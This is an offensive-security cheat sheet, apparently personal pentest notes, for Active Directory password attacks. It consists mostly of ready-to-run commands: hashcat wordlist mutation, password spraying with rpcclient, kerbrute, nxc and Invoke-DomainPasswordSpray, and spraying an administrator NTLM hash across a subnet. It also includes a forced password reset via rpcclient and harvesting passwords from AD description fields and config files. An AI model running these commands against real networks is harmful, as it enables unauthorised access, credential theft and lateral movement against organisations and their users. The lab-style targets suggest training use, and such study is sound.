---
tags:
  - Authenticated
  - Initial-Access
  - Lateral-Movement
  - Privilege-Escalation
  - Unauthenticated
  - AD
---
!!! alert "note"
	It is worth targeting high-value hosts such as `SQL` or `Microsoft Exchange` servers, as they are more likely to have a highly privileged user logged in or have their credentials persistent in memory.
## Wordlist Generation
---
**Add likely words to a file (domain name, seasons, employees, etc).**
Use hashcat with ruleset to generate the alterations
```C
hashcat --force words.txt -r /usr/share/hashcat/rules/best64.rule --stdout > wordlist.txt
```
you should also prolly append an exclamation point to the words as well.
  
## Password Spraying
---
**From Linux**
---
```Python
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```
```Python
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```
```Python
nxc smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```
```Python
nxc smb 172.16.5.5 -u avazquez -p Password123
```
Spray local admin hash around domain
```Python
nxc smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

!!! alert "note" 
	The `--local-auth` flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout. `Make sure this flag is set so we don't potentially lock out the built-in administrator for the domain`


**From Windows**
[https://github.com/dafthack/DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out.
```Python
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```
```Python
Invoke-DomainPasswordSpray -UserList users.txt -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```
## External Password Spraying
---
- Microsoft 0365
- Outlook Web Exchange
- Exchange Web Access
- Skype for Business
- Lync Server
- Microsoft Remote Desktop Services (RDS) Portals
- Citrix portals using AD authentication
- VDI implementations using AD authentication such as VMware Horizon
- VPN portals (Citrix, SonicWall, OpenVPN, Fortinet, etc. that use AD authentication)
- Custom web applications that use AD authentication
# Workarounds
---
“Password must be changed on next logon”
“Password_must_change”
You can try two things
```C
rpcclient -U <user> <IP>
rpcclient $> setuserinfo2 <user> 23 'Password123!'
```
```C
smbpasswd -U <user> -r <IP>
```
## Password in Description Field
---
Sensitive information such as account passwords are sometimes found in the user account Description or Notes fields and can be quickly enumerated using PowerView. For large domains, it is helpful to export this data to a CSV file to review offline.

**Remote**
```bash
nxc ldap <hostname> -u <user> -p <pass> -M get-desc-users
```
**Local**
```Bash
Import-Module powerview.ps1
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
```

## Passwords in files
___
```cmd-session
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```
